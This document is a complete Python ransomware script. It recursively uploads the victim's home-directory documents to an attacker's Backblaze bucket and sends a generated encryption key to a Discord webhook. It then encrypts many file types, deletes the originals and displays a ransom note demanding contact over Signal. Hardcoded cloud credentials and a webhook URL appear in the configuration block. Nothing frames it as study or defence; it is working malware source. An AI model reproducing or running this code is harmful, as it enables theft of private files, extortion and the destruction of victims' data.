#!/usr/bin/env python3
import os
import sys
import time
import requests
from urllib.parse import quote
from cryptography.fernet import Fernet
import tkinter as tk
from tkinter import messagebox
import random
# -------------------------------
# Configuration Variables
# -------------------------------

# Backblaze credentials (replace with your own)
B2_KEY_ID = "004d6b49cedd3f50000000006"
B2_APP_KEY = "K004eLkdmm6a3B2Y5ax8rVx2+I2gxYo"
BUCKET_ID = "7d562b74499c7e3d9d530f15"
random_int = random.randint(10**7, 10**8 - 1)
# Discord webhook URL for sending the encryption key.
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1347425598217130035/f1qfzFJ4_nLfi4HGcwM4sKcLN9o6iL92NBDWi33omrR_75FeznuTG4-norKlidVscduo"

# Allowed file extensions for upload (from your first script)
ALLOWED_EXTENSIONS_UPLOAD = {".pdf", ".tex", ".docx"}
# Allowed file extensions for encryption (from your second script)
ALLOWED_EXTENSIONS_ENCRYPT = {".pdf", ".tex", ".docx", ".xls", ".xlsx", ".png", ".jpg", ".ppx"}

# -------------------------------
# Upload Functions (unchanged)
# -------------------------------

def authenticate():
    url = "https://api.backblazeb2.com/b2api/v2/b2_authorize_account"
    response = requests.get(url, auth=(B2_KEY_ID, B2_APP_KEY))
    if response.status_code != 200:
        print("Authentication failed:", response.text)
        sys.exit(1)
    data = response.json()
    api_url = data.get("apiUrl")
    auth_token = data.get("authorizationToken")
    if not api_url or not auth_token:
        print("Invalid authentication response.")
        sys.exit(1)
    return api_url, auth_token

def get_upload_url(api_url, auth_token):
    url = f"{api_url}/b2api/v2/b2_get_upload_url"
    headers = {"Authorization": auth_token}
    payload = {"bucketId": BUCKET_ID}
    response = requests.post(url, headers=headers, json=payload)
    if response.status_code != 200:
        print("Failed to get upload URL:", response.text)
        sys.exit(1)
    data = response.json()
    upload_url = data.get("uploadUrl")
    upload_auth_token = data.get("authorizationToken")
    if not upload_url or not upload_auth_token:
        print("Invalid upload URL response.")
        sys.exit(1)
    return upload_url, upload_auth_token

def upload_file(file_path, upload_url, upload_auth_token, max_retries=3):
    file_name = os.path.basename(file_path)
    # URL-encode the file name to safely handle spaces and special characters.
    encoded_file_name = quote(file_name, safe="")
    if file_name != encoded_file_name:
        print(f"Encoding file name: {file_name} -> {encoded_file_name}")
    
    headers = {
        "Authorization": upload_auth_token,
        "X-Bz-File-Name": encoded_file_name,
        "Content-Type": "application/octet-stream",
        "X-Bz-Content-Sha1": "do_not_verify"
    }
    attempt = 0
    while attempt < max_retries:
        attempt += 1
        try:
            with open(file_path, "rb") as f:
                response = requests.post(upload_url, headers=headers, data=f)
            if response.status_code == 200:
                print(f"Uploaded: {file_path}")
                return True
            else:
                print(f"Failed to upload {file_path}: {response.status_code} {response.text} (attempt {attempt})")
        except Exception as errUpload:
            print(f"Error uploading {file_path}: {errUpload} (attempt {attempt})")
        time.sleep(2)
    print(f"File upload failed after {max_retries} attempts: {file_path}")
    return False

def traverse_and_upload(root, upload_url, upload_auth_token):
    # Traverse directories in a DFS manner, skipping hidden files/folders
    # and directories named "Library" or "Applications".
    try:
        with os.scandir(root) as entries:
            for entry in entries:
                if entry.name.startswith("."):
                    continue
                if entry.is_dir(follow_symlinks=False):
                    if entry.name in {"Library", "Applications"}:
                        continue
                    traverse_and_upload(entry.path, upload_url, upload_auth_token)
                elif entry.is_file(follow_symlinks=False):
                    ext = os.path.splitext(entry.name)[1].lower()
                    if ext in ALLOWED_EXTENSIONS_UPLOAD:
                        upload_file(entry.path, upload_url, upload_auth_token)
    except PermissionError:
        print(f"Permission denied: {root}")

# -------------------------------
# Encryption Functions (unchanged)
# -------------------------------

def generate_encryption_key():
    """
    Generate a new Fernet encryption key.
    Returns the key as a base64-encoded bytestring.
    """
    key = Fernet.generate_key()
    return key

def send_key_to_discord(key):
    """
    Sends the encryption key to a Discord webhook.
    The key is converted to a string for posting.
    """
    key_str = key.decode("utf-8")
    payload = {"content": f"Encryption key generated: `{key_str}` USERID: `{random_int}`"}
    response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
    if response.status_code == 204:
        print("Encryption key successfully sent to Discord.")
    else:
        print("Failed to send encryption key to Discord. Response:", response.text)

def encrypt_file(file_path, key, delete_original=False):
    """
    Encrypts the specified file using the provided key.
    Writes the encrypted file with a '.encrypted' extension.
    
    Parameters:
        file_path (str): The path to the file to encrypt.
        key (bytes): The Fernet encryption key.
        delete_original (bool): Whether to delete the original file after encryption.
    
    Returns:
        encrypted_file_path (str): Path of the newly created encrypted file.
    """
    cipher = Fernet(key)
    
    try:
        with open(file_path, "rb") as file:
            data = file.read()
    except Exception as e:
        print(f"Error reading file {file_path}: {e}")
        return None

    encrypted_data = cipher.encrypt(data)
    encrypted_file_path = file_path + ".encrypted"
    
    try:
        with open(encrypted_file_path, "wb") as file:
            file.write(encrypted_data)
        print(f"Encrypted: {file_path} -> {encrypted_file_path}")
    except Exception as e:
        print(f"Error writing encrypted file {encrypted_file_path}: {e}")
        return None

    if delete_original:
        try:
            os.remove(file_path)
            print(f"Original file deleted: {file_path}")
        except Exception as e:
            print(f"Error deleting original file {file_path}: {e}")

    return encrypted_file_path

def traverse_and_encrypt(root, key, delete_original=False):
    # Recursively traverses the directory starting at 'root'
    # and encrypts files with allowed extensions.
    # Skips hidden files/folders and directories named "Library" or "Applications".
    try:
        with os.scandir(root) as entries:
            for entry in entries:
                if entry.name.startswith("."):
                    continue
                if entry.is_dir(follow_symlinks=False):
                    if entry.name in {"Library", "Applications"}:
                        continue
                    traverse_and_encrypt(entry.path, key, delete_original)
                elif entry.is_file(follow_symlinks=False):
                    ext = os.path.splitext(entry.name)[1].lower()
                    if ext in ALLOWED_EXTENSIONS_ENCRYPT:
                        encrypt_file(entry.path, key, delete_original)
    except PermissionError:
        print(f"Permission denied: {root}")

# -------------------------------
# Main Execution
# -------------------------------

def main():
    home_dir = os.path.expanduser("~")
    
    # --- UPLOAD PASS ---
    print("Authenticating with Backblaze...")
    api_url, auth_token = authenticate()
    print("Retrieving upload URL...")
    upload_url, upload_auth_token = get_upload_url(api_url, auth_token)
    print("Upload URL obtained. Starting recursive upload from", home_dir)
    traverse_and_upload(home_dir, upload_url, upload_auth_token)
    
    # --- ENCRYPTION PASS ---
    # Generate the encryption key and send it to Discord.
    key = generate_encryption_key()
    print("Encryption key generated.")
    send_key_to_discord(key)
    
    print(f"Starting recursive encryption from: {home_dir}")
    traverse_and_encrypt(home_dir, key, delete_original=True)

def show_popup(message):
    root = tk.Tk()
    root.withdraw()  # Hide the main window
    messagebox.showinfo("Popup", message)
    root.destroy()

if __name__ == "__main__":
    main()
    # Define a multi-line message using a triple-quoted string
multi_line_message = """ATTENTION:
ALL YOUR VALUABLE AND IMPORTANT FILES HAVE BEEN ENCRYPTED. THIS INCLUDES ALL YOUR FILE OF THE FOLLOWING TYPE:  .PDF, .TEX, .DOCX, and other files. 

These files have been encrypted with the strongest of encryption algorithms, and the encryption keys have been sent to a secure remote server. 

DO NOT TRY TO RENAME YOUR FILES OR DECRYPT THEM USING THIRD PARTY SOFTWARE. If this is done, it will likely corrupt your files, as only we have the keys to your files.

We have a decryption script, and with this script, all your files can be decrypted.  To access this, download Signal, the messaging app, and text your ID to the username: decrypt.26

Your ID is $ID 

"""

show_popup(multi_line_message)
